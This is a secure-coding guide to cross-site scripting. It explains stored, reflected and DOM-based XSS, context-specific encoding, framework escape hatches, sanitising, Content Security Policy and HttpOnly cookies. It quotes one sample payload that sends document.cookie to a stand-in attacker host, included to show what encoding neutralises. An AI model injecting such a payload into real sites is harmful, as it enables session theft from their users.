# Cross-site scripting (XSS)

XSS is injection into a web **page**: an attacker gets their JavaScript to run in other users' browsers, **on your site's origin**. That script can do anything the user can do: read the page, call your APIs with the user's session, change their e-mail address, show a fake login form or log keystrokes.

## The three kinds

| Kind | The script comes from | Example |
|---|---|---|
| **Stored** | your database: a comment, a profile, a product review | every visitor of the page runs it |
| **Reflected** | the request itself: `/search?q=<script>…` | the victim clicks a crafted link |
| **DOM-based** | client-side JavaScript writing input into the page | `el.innerHTML = location.hash.slice(1)` |

## The fix: encode for the context

The attached `xss-demo.js` takes a comment containing

```html
<img src=x onerror="fetch('https://attacker.example/steal?c=' + document.cookie)">
```

Inserted as-is, the browser creates the image, it fails to load, and the `onerror` handler runs. **HTML-encoded**, the same text is displayed harmlessly:

```html
&lt;img src=x onerror=&quot;fetch(…)&quot;&gt;
```

| Context | Encoding |
|---|---|
| HTML body text | `&` `<` `>` `"` `'` to HTML entities |
| HTML attribute | the same, and always quote the attribute |
| URL in `href`/`src` | **validate the scheme** (`http`/`https` only); encoding alone doesn't stop `javascript:` URLs |
| Inside `<script>` | serialize as JSON, and escape `<` as `<` so `</script>` can't close the block |
| CSS | avoid putting user input there |

The demo shows each case, including a `javascript:` link that survives HTML encoding perfectly, and is still dangerous.

## Use the framework's safe default

Modern frameworks encode automatically: React's `{value}`, Angular's bindings, Razor's `@value`, Jinja2 with autoescape on. XSS comes back through their **escape hatches**:

- React's `dangerouslySetInnerHTML`, Vue's `v-html`, Angular's `bypassSecurityTrustHtml`;
- `innerHTML`, `outerHTML`, `document.write` and `insertAdjacentHTML` in plain JavaScript (use `textContent` instead);
- `href={userUrl}` without checking the scheme.

When users must submit rich HTML (a rich-text editor), **sanitize** it with a maintained library such as DOMPurify, which keeps safe tags and removes scripts, event handlers and dangerous URLs.

## Content Security Policy: the safety net

A CSP header tells the browser which scripts may run. A strict policy blocks inline scripts and event handlers, so most injected payloads simply don't execute:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-R4nd0m…'; object-src 'none';
                         base-uri 'none'; frame-ancestors 'none'
```

- Scripts only from your own origin, or inline scripts carrying this response's random **nonce** (a new one per response).
- `object-src 'none'`: no plugins.
- `frame-ancestors 'none'`: other sites can't frame you (clickjacking).

Roll it out with `Content-Security-Policy-Report-Only` first, collect the violation reports, fix them, then enforce. CSP is **defense in depth**: it doesn't replace encoding.

## Limit what a successful XSS can steal

Mark session cookies **HttpOnly**, so that JavaScript (including injected JavaScript) can't read them. The attacker can still act *in* the page, but can't take the session elsewhere.
